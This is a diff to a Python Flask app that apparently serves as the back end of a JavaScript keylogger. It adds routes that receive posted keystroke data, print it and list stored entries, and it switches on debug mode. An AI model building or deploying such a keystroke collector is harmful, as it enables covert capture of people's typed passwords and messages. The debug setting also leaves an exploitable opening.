@@ -13,16 +13,6 @@ class Key:
   def toJSON(self):
     return json.dumps(self, default=lambda o: o.__dict__, sort_keys=True, indent=4)
 
-
-def generateJSON(statusCode, statusMessage, payload):
-  return jsonify({
-    "statusCode": statusCode,
-    "statusMessage": statusMessage,
-    "payload": payload
-  })
-
-  return 0
-
 #start flask app
 app = Flask(__name__)
 
@@ -32,7 +22,7 @@ def hello():
 
 @app.route('/js_keylog', methods=['POST'])
 def addLog():
-  data = json.loads(request.data)
+  data = request.get_json()
 
   for key in range(len(data)):
     print(data[key])
@@ -46,9 +36,17 @@ def addLog():
   return make_response(jsonify({'response': 'Success', 'code':200}), 200)
 
 @app.route('/js_keylog', methods=['GET'])
-def showKeylog():
-
+def keylogPage():
   return render_template('js_keylog.html')
 
+@app.route('/showKeylog', methods=['GET'])
+def showKeylog():
+  res = {}
+  
+  for k in range(len(keylog)):
+    res[k] = keylog[k].toJSON()
+    print(res[k])
+  return res
+
 if __name__ == "__main__":
-  app.run()
+  app.run(debug=True)
